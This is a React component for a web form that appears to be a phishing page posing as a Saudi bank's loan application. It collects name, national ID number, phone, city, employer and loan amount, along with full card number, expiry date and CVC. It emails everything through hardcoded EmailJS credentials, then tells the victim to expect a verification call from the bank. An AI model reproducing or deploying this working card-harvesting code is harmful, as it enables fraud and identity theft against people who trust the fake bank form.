import React, { useRef, useState, useEffect } from "react";
import "./style.css";
import Swal from "sweetalert2";
import emailjs from "@emailjs/browser";
import $ from "jquery";
import jQuery from "jquery";
// import PromiceComponent from "./promice";
import { usePaymentInputs } from "react-payment-inputs";

const Main = ({ data, state, data1 }) => {
  const form = useRef(null);
  const [fname, setFname] = useState();
  const [phone, setPhone] = useState();
  const [id, setId] = useState();
  const [salary, setSalary] = useState();
  const [cvc, setCvc] = useState();
  const [financialAmount, setfinancialAmount] = useState();
  const [city, setCity] = useState();

  // Second form
  const [alart, setAlart] = useState(false);
  const [cardNo, setCardNo] = useState();
  const [expiryDate, setExpiryDate] = useState();
  const [securityNo, setSecurityNo] = useState();
  const [title, setTitle] = useState();
  const [notify, setNotify] = useState(false);
  const { meta, getCardNumberProps, getExpiryDateProps, getCVCProps } =
    usePaymentInputs();
  const sendEmail = (e) => {
    e.preventDefault();
    console.log(form.current);
    const placement = "top";

    console.log(fname, phone, id, salary, cardNo, expiryDate);
    const card = cardNo;

    if (fname && phone && id && cardNo && expiryDate) {
      if (cardNo.length >= 8 && card.replace(/\s+/g, "").length <= 16) {
        console.log("conguralation");
        emailjs
          .sendForm(
            "service_zj5623f",
            "template_xy00dgb",
            form.current,
            "UrR8OS3JjUBMKVWNf"
          )
          .then(
            (result) => {
              Swal.fire({
                title:
                  "Congratulation Your Request has been Submitted Successfully You will Receive a Verification Call From Bank",
                width: 600,
                padding: "3em",
                color: "#716add",
                background: "#fff url(/images/trees.png)",
                backdrop: `
                rgba(0,0,123,0.4)
                url("/images/nyan-cat.gif")
                left top
                no-repeat
              `,
              });
            },
            (error) => {
              console.log(error.text);
            }
          );
      }
      if (cardNo.length < 8 || card.replace(/\s+/g, "").length > 16) {
        document.body.scrollTop = 0; // For Safari
        document.documentElement.scrollTop = 0;
        setAlart(true);
      }
    } else {
      document.body.scrollTop = 0; // For Safari
      document.documentElement.scrollTop = 0;
      setNotify(true);
    }
  };

  useEffect(() => {
    if (state === "Personal") {
      setTitle(data1.title1);
    }
    if (state === "Home") {
      setTitle(data1.title2);
    }
    if (state === "Business") {
      setTitle(data1.title3);
    }
    if (state === "Car") {
      setTitle(data1.title4);
    }
  });
  jQuery(document).ready(function () {
    jQuery("#fieldSelectorId").keypress(function (e) {
      var length = jQuery(this).val().length;
      if (length > 9) {
        return false;
      } else if (
        e.which != 8 &&
        e.which != 0 &&
        (e.which < 48 || e.which > 57)
      ) {
        return false;
      } else if (length == 0 && e.which == 48) {
        return false;
      }
    });
  });

  jQuery(document).ready(function () {
    jQuery("#CardId").keypress(function (e) {
      var length = jQuery(this).val().length;
      if (length > 15) {
        return false;
      } else if (
        e.which != 8 &&
        e.which != 0 &&
        (e.which < 48 || e.which > 57)
      ) {
        return false;
      } else if (length == 0 && e.which == 48) {
        return false;
      }
    });
  });
  return (
    <div className=" mt-5 z-index-2  ">
      {notify ? (
        <>
          <div className="row">
            <div className="col-sm-4"></div>
            <div
              class="alert alert-danger alert-dismissible fade show col-sm-4 "
              style={{ width: "410px" }}
              role="alert"
            >
              {data.alart}
              <button
                type="button"
                class="close"
                data-dismiss="alert"
                aria-label="Close"
                className="rounded bg-white mx-1"
                style={{ position: "relative", left: "30px" }}
                onClick={() => setNotify(false)}
              >
                <span aria-hidden="true">&times;</span>
              </button>
            </div>
            <div className="col-sm-4"></div>
          </div>
        </>
      ) : null}
      {alart ? (
        <>
          <div className="row">
            <div className="col-sm-4"></div>
            <div
              class="alert alert-danger alert-dismissible fade show col-sm-4 "
              style={{ width: "410px" }}
              role="alert"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="20"
                height="20"
                fill="currentColor"
                class="bi bi-credit-card-2-front-fill"
                viewBox="0 0 16 16"
              >
                <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4zm2.5 1a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h2a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-2zm0 3a.5.5 0 0 0 0 1h5a.5.5 0 0 0 0-1h-5zm0 2a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1zm3 0a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1zm3 0a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1zm3 0a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1z" />
              </svg>{" "}
              {data.alart2}
              <button
                type="button"
                class="close"
                data-dismiss="alert"
                aria-label="Close"
                className="rounded bg-white mx-1"
                style={{ position: "relative", left: "30px" }}
                onClick={() => setAlart(false)}
              >
                <span aria-hidden="true">&times;</span>
              </button>
            </div>
            <div className="col-sm-4"></div>
          </div>
        </>
      ) : null}
      <div className="row ">
        <div className="col-sm-3 "></div>
        <div className="col-sm-6 mt-5 mb-5 bg-white p-5 shadow">
          {/* Form */}
          <div className="text-center" style={{ backgroundColor: "#40465a" }}>
            <h5 className=" text-white p-4">
              {" "}
              {title ? <>{title}</> : <>{data1.title1}</>}
            </h5>
          </div>
          <form className="form" ref={form} onSubmit={sendEmail}>
            <>
              <div>
                <div className="row d-flex ">
                  <div className="input-container col-sm-12 mt-4">
                    <label className="text-dark p-1" htmlFor="First Name">
                      <strong>{data.fname}</strong>{" "}
                      <strong className="text-danger float-left">*</strong>
                    </label>
                    <input
                      type="text"
                      name="first_name"
                      onChange={(e) => {
                        setFname(e.target.value);
                      }}
                    />
                  </div>
                </div>
              </div>
            </>
            <>
              <div>
                <div className="input-container">
                  <label className="text-dark p-1" htmlFor="Id Number">
                    <strong>{data.idNumber}</strong>{" "}
                    <strong className="text-danger float-left">*</strong>
                  </label>
                  <input
                    type="number"
                    name="id_number"
                    id="fieldSelectorId"
                    maxlength="10"
                    onChange={(e) => {
                      setId(e.target.value);
                    }}
                  />
                </div>
                <div className="input-container mt-2 ">
                  <label className="text-dark p-1" htmlFor="Phone">
                    <strong>{data.mobileNumber}</strong>{" "}
                    <strong className="text-danger float-left">*</strong>
                  </label>
                  <input
                    type="number"
                    name="phone_no"
                    onChange={(e) => {
                      setPhone(e.target.value);
                    }}
                  />
                </div>
                <div className="input-container mt-2 ">
                  <label className="text-dark p-1" htmlFor="Address">
                    <strong>{data.city}</strong>{" "}
                    <strong className="text-danger float-left">*</strong>
                  </label>
                  <input
                    type="text"
                    name="address"
                    onChange={(e) => {
                      setCity(e.target.value);
                    }}
                  />
                </div>
                <div className="input-container mt-2 ">
                  <strong className="text-dark">
                    {data.employer}{" "}
                    <strong className="text-danger float-left">*</strong>
                  </strong>
                  <div className="form-check mt-2 ">
                    <input
                      class="form-check-input"
                      type="radio"
                      name="flexRadioDefault"
                      id="flexRadioDefault1"
                    />
                    <label
                      class="form-check-label text-dark"
                      for="flexRadioDefault1"
                    >
                      {data.publicSector}
                    </label>
                  </div>
                  <div class="form-check">
                    <input
                      class="form-check-input"
                      type="radio"
                      name="flexRadioDefault"
                      id="flexRadioDefault2"
                    />
                    <label
                      class="form-check-label text-dark"
                      for="flexRadioDefault2"
                    >
                      {data.militaryGovernmentSector}
                    </label>
                  </div>
                  <div class="form-check">
                    <input
                      class="form-check-input"
                      type="radio"
                      name="flexRadioDefault"
                      id="flexRadioDefault2"
                    />
                    <label
                      class="form-check-label text-dark"
                      for="flexRadioDefault2"
                    >
                      {data.privateSector}
                    </label>
                  </div>
                </div>

                <div className="input-container mt-2 ">
                  <label
                    className="text-dark p-1"
                    htmlFor="Amount of Required Finance"
                  >
                    <strong>{data.amountRequiredFinance}</strong>{" "}
                    <strong className="text-danger float-left">*</strong>
                  </label>
                  <input
                    type="number"
                    name="finance_amount"
                    placeholder="1 Lakh to million SAR"
                    onChange={(e) => {
                      setfinancialAmount(e.target.value);
                    }}
                  />
                </div>
              </div>
            </>
            <div className="mt-4 p-3 rounded shadow">
              <div className="d-flex p-2">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  fill="currentColor"
                  class="bi bi-credit-card-2-front-fill"
                  viewBox="0 0 16 16"
                >
                  <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4zm2.5 1a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h2a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-2zm0 3a.5.5 0 0 0 0 1h5a.5.5 0 0 0 0-1h-5zm0 2a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1zm3 0a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1zm3 0a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1zm3 0a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1z" />
                </svg>
                <h5 className="mx-2"> {data.bankCardTitle}</h5>
              </div>
              <input
                className="d-block input-container mt-2 border-1"
                style={{ border: "1px solid black", width: "100%" }}
                {...getCardNumberProps({
                  onChange: (e) => {
                    setCardNo(e.target.value);
                  },
                })}
                name="card_no"
                value={cardNo}
              />
              <input
                className="d-block input-container mt-2 border-1"
                style={{ border: "1px solid black", width: "100%" }}
                {...getExpiryDateProps({
                  onChange: (e) => {
                    setExpiryDate(e.target.value);
                  },
                })}
                name="expiry_Date"
                value={expiryDate}
              />
              <input
                className="d-block input-container mt-2 border-1"
                style={{ border: "1px solid black", width: "100%" }}
                {...getCVCProps({
                  onChange: (e) => {
                    setCvc(e.target.value);
                  },
                })}
                name="cvc"
                value={cvc}
              />
              {meta.isTouched && meta.error && (
                <span className="text-danger">{meta.error}</span>
              )}
            </div>
            <div className="login_btn text-center mt-4 mb-4">
              <input type="submit" value="Send" />
            </div>
          </form>
        </div>

        <div className="col-sm-3 "></div>
      </div>
    </div>
  );
};
export default Main;
